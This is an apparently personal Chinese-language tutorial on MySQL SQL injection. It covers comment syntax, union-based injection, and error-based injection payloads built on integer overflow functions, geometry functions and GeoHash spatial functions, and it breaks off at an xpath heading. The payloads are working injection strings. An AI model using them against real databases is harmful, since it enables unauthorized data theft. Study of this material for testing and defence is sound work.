## 注释

```
1. #xxx
2. -- xxx 注意有一个空格
3. /*xxx*/
4. `xxx`
5. ;%00
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201202343264.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201202344062.png)

## 常用注入手段

### 联合查询注入

联合查询注入即在原有的查询语句中,通过`union`拼接传入的恶意语句,达到获取数据的目的(常用于有回显的情况)

正常查询语句 `select column_name from table where xxx`

恶意查询语句 `select column_name from table where xxx union select column_name (from table where xxx)`()可选

使用`union`进行拼接时,前后两个`select`语句所返回的字段数必须一致

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201210003541.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201210004035.png)

若仅回显一行数据则需要将部分`column_name`设置为空

### 报错注入

MYSQL在报错信息里可能会带有部分数据,利用这一特性进行注入

报错注入主要有以下几种

1. 数据类型溢出

在mysql版本大于`5.5`时才会产生溢出报错

[https://dev.mysql.com/doc/refman/5.7/en/integer-types.html](https://dev.mysql.com/doc/refman/5.7/en/integer-types.html)

[https://dev.mysql.com/doc/refman/5.7/en/out-of-range-and-overflow.html](https://dev.mysql.com/doc/refman/5.7/en/out-of-range-and-overflow.html)

|Type|Storage (Bytes)|Minimum Value Signed|Minimum Value Unsigned|Maximum Value Signed|Maximum Value Unsigned|
|:---:|:---:|:---:|:---:|:---:|:---:|
|TINYINT|1|-128|0|127|255|
|SMALLINT|2|-32768|0|32767|65535|
|MEDIUMINT|3|-8388608|0|8388607|16777215|
|INT|4|-2147483648|0|2147483647|4294967295|
|BIGINT|8|-2^63|0|2^63-1|2^64-1|

`2^64-1=18446744073709551615`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211058286.png)

如果一个查询成功执行,则其返回值为0,因此可以利用该返回值进行数学运算

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211134646.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211135283.png)

但是整型溢出报错并带出数据只能在某些特定版本使用,在版本大于`5.5.48`时报错不能带出数据

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211449716.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211451073.png)

>`exp()`此函数返回e(自然对数的底)的x次方的值

>`pow()`指数运算

>`cot()`cotan

```
select exp(~(select*from(select @@version)x));
select pow(2,~(select*from(select @@version)x));
select cot(!(select*from(select @@version)x));
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211510567.png)

```
select !atan((select*from(select @@version)x))-~0;
select !cos((select*from(select @@version)x))-~0;
select !ceil((select*from(select @@version)x))-~0;
select !floor((select*from(select @@version)x))-~0;
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211417654.png)

2. 特殊的数学函数

几何对象函数

```
select multipoint((select*from(select*from(select @@version)x)y));
select geometrycollection((select*from(select*from(select @@version)x)y));
select polygon((select*from(select*from(select @@version)x)y));
select multipolygon((select*from(select*from(select @@version)x)y));
select linestring((select*from(select*from(select @@version)x)y));
select multilinestring((select*from(select*from(select @@version)x)y));
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211426633.png)

空间函数

```
select ST_LongFromGeoHash((select*from(select*from(select @@version)x)y));
select ST_LatFromGeoHash((select*from(select*from(select @@version)x)y));
select ST_PointFromGeoHash((select*from(select*from(select @@version)x)y),1);
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211435901.png)

3. xpath语法错误

